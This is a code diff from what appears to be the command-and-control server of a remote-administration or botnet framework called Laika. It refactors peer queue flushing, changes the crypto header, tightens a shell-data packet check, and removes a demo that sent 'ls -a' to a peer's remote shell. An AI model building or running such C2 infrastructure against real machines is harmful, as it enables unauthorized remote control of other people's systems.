@@ -1,5 +1,5 @@
 #include "lmem.h"
-#include "lrsa.h"
+#include "lsodium.h"
 #include "lsocket.h"
 #include "lerror.h"
 
@@ -22,7 +22,7 @@ void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
     uint8_t id;
 
-    if (sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
+    if (sz <= 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
         LAIKA_ERROR("LAIKAPKT_SHELL_DATA malformed packet!")
 
     id = laikaS_readByte(&peer->sock);
@@ -72,17 +72,6 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     laikaC_onAddPeer(cnc, peer);
 
     LAIKA_DEBUG("accepted handshake from peer %lx\n", peer);
-
-    /* shell demo */
-    char *demo = "ls -a\n";
-    laikaS_startOutPacket(peer, LAIKAPKT_SHELL_OPEN);
-    laikaS_writeByte(&peer->sock, 0);
-    laikaS_endOutPacket(peer);
-
-    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-    laikaS_writeByte(&peer->sock, 0);
-    laikaS_write(&peer->sock, demo, 6);
-    laikaS_endVarPacket(peer);
 }
 
 PeerPktHandler laikaC_handlerTbl[LAIKAPKT_MAXNONE] = {
@@ -188,11 +177,26 @@ void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     LAIKA_DEBUG("peer %lx killed!\n", peer);
 }
 
+void laikaC_flushQueue(struct sLaika_cnc *cnc) {
+    struct sLaika_peer *peer;
+    int i;
+
+    /* flush pList's outQueue */
+    for (i = 0; i < cnc->pList.outCount; i++) {
+        peer = cnc->pList.outQueue[i];
+        LAIKA_DEBUG("sending OUT to %lx\n", peer);
+        if (!laikaS_handlePeerOut(peer))
+            laikaC_killPeer(cnc, peer);
+    }
+    laikaP_resetOutQueue(&cnc->pList);
+}
+
 bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
     struct sLaika_peer *peer;
     struct sLaika_pollEvent *evnts;
     int numEvents, i;
 
+    laikaC_flushQueue(cnc);
     evnts = laikaP_poll(&cnc->pList, timeout, &numEvents);
 
     /* if we have 0 events, we reached the timeout, let the caller know */
@@ -239,14 +243,6 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
         LAIKA_TRYEND
     }
 
-    /* flush pList's outQueue */
-    for (i = 0; i < cnc->pList.outCount; i++) {
-        peer = cnc->pList.outQueue[i];
-        LAIKA_DEBUG("sending OUT to %lx\n", peer);
-        if (!laikaS_handlePeerOut(peer))
-            laikaC_killPeer(cnc, peer);
-    }
-    laikaP_resetOutQueue(&cnc->pList);
-
+    laikaC_flushQueue(cnc);
     return true;
 }
